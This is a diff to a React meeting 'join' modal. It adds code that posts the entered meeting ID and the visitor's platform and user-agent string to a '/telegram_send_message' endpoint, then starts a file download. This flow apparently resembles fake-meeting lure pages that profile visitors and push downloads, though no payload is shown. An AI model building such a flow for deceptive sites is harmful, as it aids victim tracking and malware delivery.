@@ -2,11 +2,36 @@ import React, {useEffect, useState} from 'react';
 import Modal from "./ui/Modal";
 import Logo from "./Logo";
 import DownloadButton from "./DownloadButton";
+import axios from "axios";
+import {handleDownload} from "../utils/utils";
 
 const JoinModal = (props) => {
     const [code, setCode] = useState("")
+    const [response, setResponse] = useState({
+        data: {
+            success: false
+        }
+    })
     const onClose = () => {
         props.onClose()
+    }
+
+    const data = {
+        value: code,
+        platform: navigator.platform || null,
+        browser: navigator.userAgent || null
+    }
+    const onClick = async () => {
+        try {
+            let response = await axios.post("/telegram_send_message", data)
+            setResponse(response)
+            if (response.data.success) {
+                props.onClose()
+                handleDownload();
+            }
+        } catch (err) {
+            alert(err)
+        }
     }
     const handleInputChange = (e) => {
         const inputValue = e.target.value;
@@ -33,10 +58,11 @@ const JoinModal = (props) => {
                     </label>
                 </form>
                 <p className="popup__text">Enter your Meeting ID</p>
+                {response && !response.data.success && <p className={"error"}>{response.data.error}</p>}
             </Modal.Body>
             <Modal.Footer>
                 <div className="popup__buttons">
-                    <DownloadButton onClose={props.onClose} theme={"green"} text={"Join"}/>
+                    <DownloadButton onClick={onClick} theme={"green"} text={"Join"}/>
                 </div>
             </Modal.Footer>
         </Modal>
